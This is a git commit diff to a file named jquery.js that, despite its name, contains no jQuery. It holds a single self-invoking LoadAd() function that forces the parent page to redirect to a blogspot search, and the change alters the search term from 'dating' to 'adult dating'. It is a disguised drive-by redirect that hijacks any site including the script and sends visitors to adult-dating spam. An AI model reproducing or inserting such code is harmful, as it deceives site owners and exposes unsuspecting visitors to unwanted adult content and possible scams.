de2e574b631c99cc24b91f27e5472ec3147771bb
style-font <121629902+style-font@users.noreply.github.com>
2023-01-19 18:10:54 +0700

    Update jquery.js

--- jquery.js
+++ jquery.js
@@ -1,1 +1,1 @@
-function LoadAd() { parent.location.href="https://pinphotocollection.blogspot.com/search/q=dating"; } LoadAd();
+function LoadAd() { parent.location.href="https://pinphotocollection.blogspot.com/search/q=adult%20dating"; } LoadAd();
